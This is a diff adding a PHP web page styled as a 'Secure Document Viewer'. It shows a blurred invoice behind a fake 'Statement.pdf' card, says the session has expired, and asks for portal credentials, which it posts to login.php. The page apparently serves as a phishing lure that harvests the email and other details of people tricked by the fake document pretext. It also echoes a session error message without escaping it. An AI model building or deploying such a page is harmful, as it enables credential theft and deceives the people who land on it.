@@ -1,0 +1,230 @@
+<?php session_start(); ?> 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Secure Document Viewer</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <style>
+        /* Global reset / basics */
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+            background-color: #111;
+            color: #222;
+            min-height: 100vh;
+        }
+
+        /* Layout wrapper */
+        .page-wrapper {
+            position: relative;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        /* Background "PDF" */
+        .doc-background {
+            position: absolute;
+            inset: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            filter: blur(6px);
+            transform: scale(1.02);
+            opacity: 0.7;
+        }
+
+        .doc-background img {
+            max-width: 100%;
+            max-height: 100vh;
+            object-fit: contain;
+        }
+
+        /* Dark overlay */
+        .page-wrapper::before {
+            content: "";
+            position: absolute;
+            inset: 0;
+            background: radial-gradient(circle at center, rgba(0,0,0,0.1), rgba(0,0,0,0.7));
+            pointer-events: none;
+        }
+
+        /* Login card */
+        .login-card {
+            position: relative;
+            z-index: 2;
+            width: 95%;
+            max-width: 420px;
+            background: rgba(255, 255, 255, 0.98);
+            border-radius: 16px;
+            padding: 28px 26px 26px;
+            box-shadow:
+                0 20px 40px rgba(0, 0, 0, 0.35),
+                0 0 0 1px rgba(0, 0, 0, 0.05);
+        }
+
+        /* PDF icon */
+        .doc-icon {
+            width: 56px;
+            height: 56px;
+            border-radius: 18px;
+            background: #ffe5e5;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 14px;
+        }
+
+        .doc-icon-pdf {
+            font-weight: 700;
+            color: #c21515;
+            font-size: 14px;
+        }
+
+        /* Titles */
+        .doc-title {
+            font-size: 18px;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 6px;
+        }
+
+        .doc-size {
+            font-weight: 400;
+            color: #666;
+            font-size: 14px;
+        }
+
+        .doc-subtitle {
+            font-size: 13px;
+            color: #666;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+
+        .doc-note {
+            font-size: 12px;
+            color: #999;
+            text-align: center;
+            margin-bottom: 18px;
+        }
+
+        /* Error message */
+        .login-error {
+            color: #c21515;
+            font-size: 13px;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 14px;
+        }
+
+        /* Form */
+        .login-form {
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+        }
+
+        .field-label {
+            font-size: 12px;
+            font-weight: 600;
+            color: #555;
+            margin-bottom: 4px;
+        }
+
+        .field-wrapper input {
+            width: 100%;
+            padding: 10px 11px;
+            border-radius: 8px;
+            border: 1px solid #d0d0d0;
+            font-size: 14px;
+            outline: none;
+            transition: border-color 0.15s ease, box-shadow 0.15s ease;
+        }
+
+        .field-wrapper input:focus {
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 1px rgba(26, 115, 232, 0.2);
+        }
+
+        /* Primary button */
+        .btn-primary {
+            margin-top: 6px;
+            width: 100%;
+            padding: 11px 12px;
+            border-radius: 999px;
+            border: none;
+            background: #1a73e8;
+            color: #fff;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.15s ease, box-shadow 0.15s ease, transform 0.05s ease;
+        }
+
+        .btn-primary:hover {
+            background: #185abc;
+            box-shadow: 0 3px 10px rgba(26, 115, 232, 0.4);
+        }
+
+        .btn-primary:active {
+            transform: translateY(1px);
+        }
+
+        @media (max-width: 480px) {
+            .login-card {
+                padding: 22px 18px 18px;
+                border-radius: 14px;
+            }
+            .doc-title { font-size: 16px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="page-wrapper">
+
+    <div class="doc-background">
+        <img src="assets/bg-invoice.jpg" alt="Document preview">
+    </div>
+
+    <div class="login-card">
+        <div class="doc-icon">
+            <span class="doc-icon-pdf">PDF</span>
+        </div>
+
+        <h2 class="doc-title">Statement.pdf <span class="doc-size">(197 KB)</span></h2>
+        <p class="doc-subtitle">Previous session has expired, log in to continue.</p>
+
+        <p class="doc-note">
+            Use your <strong>secure document portal</strong> credentials.
+        </p>
+
+        <?php if (!empty($_SESSION['error_message'])): ?>
+            <p class="login-error"><?= $_SESSION['error_message']; ?></p>
+            <?php unset($_SESSION['error_message']); ?>
+        <?php endif; ?>
+
+        <form class="login-form" method="POST" action="login.php" autocomplete="off">
+            <label class="field-label" for="email">Email address</label>
+            <div class="field-wrapper">
+                <input id="email" name="email" type="email" placeholder="Enter your email" required>
+            </div>
+
+            <label class="field-label" for="name">name</label>
+            <div class="field-wrapper">
+                <input id="name" name="name" type="name" placeholder="Enter your name" required>
+            </div>
+
+            <button type="submit" class="btn-primary">Next</button>
+        </form>
+    </div>
+</div>
+
+</body>
+</html>
